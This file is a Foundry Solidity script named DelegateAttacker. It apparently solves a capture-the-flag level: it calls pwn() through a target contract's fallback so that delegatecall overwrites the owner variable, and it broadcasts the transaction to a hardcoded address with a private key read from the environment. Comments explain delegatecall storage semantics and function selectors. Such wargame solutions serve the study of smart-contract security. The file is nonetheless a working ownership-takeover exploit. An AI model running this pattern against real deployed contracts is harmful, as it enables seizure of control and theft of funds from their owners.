//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "../src/Delegate.sol";

contract DelegateAttacker is Script {
    Delegation delegationContract =
        Delegation(0x538fe71264Ba71bdb6DAfF1D144F4b87C627DC8F);

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        /**We can delegate the execution of some logic to another contract using delegatecall()
         *the Delegation contract is using delegatecall to execute the Delegate contracts pwn() 
         *pwn() changes the owner variable to the msg.sender of pwn()
         * delegatecall also preserves the msg.sender and msg.value of the calling contract.
         * and also delegatecall manipulates the storage variables of the contract who calls delegatecall so the Delegation contract in this instance
         * 
         * Awesome so what we need to do is execute the fallback function in delegation
         * 
         * Fallback functions are executed when no method is recognized or no data is sent: https://www.geeksforgeeks.org/solidity-fall-back-function
         * sending ether with no data will call recieve
         * send no data or a unrecongized method call will call fallback
         * 
         * In order to call a function, we can take the first 4 bytes of the keccak256 hash of the function signature 
         * and then call the delegation contract and pass in the function signature. 
         * 
         * 
         * 
        */
        
        bytes4 functionSig = bytes4(keccak256(bytes("pwn()")));
        (bool success, ) = address(delegationContract).call(
            abi.encodePacked((functionSig))
        );
        require(success, "Failed");
        vm.stopBroadcast();
    }
}
